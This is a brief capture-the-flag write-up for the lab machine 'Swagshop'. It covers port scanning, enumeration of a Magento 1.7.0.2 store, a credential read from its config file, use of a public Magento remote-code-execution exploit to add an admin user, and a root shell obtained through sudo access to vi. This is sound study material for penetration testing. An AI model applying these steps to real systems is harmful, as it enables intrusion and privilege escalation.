# Swagshop

### Nmap

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

### Web Enum

```
http://swagshop.htb/app/ -> dir
http://swagshop.htb/api.php/ -> Invalid webservice adapter specified.
http://swagshop.htb/cron.php/
http://swagshop.htb/errors/ -> dir
http://swagshop.htb/includes/ -> dir
http://swagshop.htb/js/ -> SYNTAX: index.php/x.js?f=dir1/file1.js,dir2/file2.js

http://swagshop.htb/shell/ -> This script cannot be run from Browser. This is the shell script.

http://swagshop.htb/index.php/customer/account/login/ -> login

http://swagshop.htb/index.php/admin/ -> admin login

Magento 1.7.0.2

# http://swagshop.htb/app/etc/local.xml
root:fMVWh7bDHpgZkyfqQXreTjU9
```

### Exploitation

```bash
# found public exploit that add evil user to the system
Magento eCommerce - Remote Code Execution  | xml/webapps/37977.py

# run exploit to add evil login user
python2 37977.py

# then refer to https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper
```

### Priv Esc

```bash
# found sudo access
(root) NOPASSWD: /usr/bin/vi /var/www/html/*

# execute commands to get root shell through vi command interface
:set shell=/bin/sh
:shell

```
